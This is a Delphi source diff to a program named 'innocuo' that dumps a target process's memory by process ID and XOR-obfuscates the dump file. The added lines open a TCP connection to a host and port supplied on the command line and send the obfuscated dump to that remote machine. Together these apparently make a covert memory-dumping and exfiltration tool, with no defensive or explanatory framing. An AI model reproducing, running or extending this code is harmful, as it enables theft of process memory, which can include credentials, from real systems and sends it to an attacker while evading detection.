@@ -6,10 +6,12 @@ program innocuo;
 
 uses
   System.SysUtils,
-  uimagehlp,uxor;
+  uimagehlp,uxor,IdTCPClient{,IdTCPConnection};
 
 var
 key:string;
+
+var idTCPClient         : TIdTCPClient;
 
 begin
   try
@@ -23,7 +25,16 @@ begin
     end
     else
      begin
-      dumpprocess(strtoint(paramstr(1))) //15156
+      dumpprocess(strtoint(paramstr(1))); //15156
+      if paramstr(2)<>'' then
+       begin
+        idTCPClient                 := TIdTCPClient.Create();
+        idTCPClient.Host            := paramstr(2);
+        idTCPClient.Port            := strtoint(paramstr(3));
+        IdTCPClient.Connect;
+        idTCPClient.IOHandler.WriteFile(paramstr(1)+'.dmp.obfusco');
+        idTCPClient.Disconnect;
+       end;
      end;
   except
     on E: Exception do
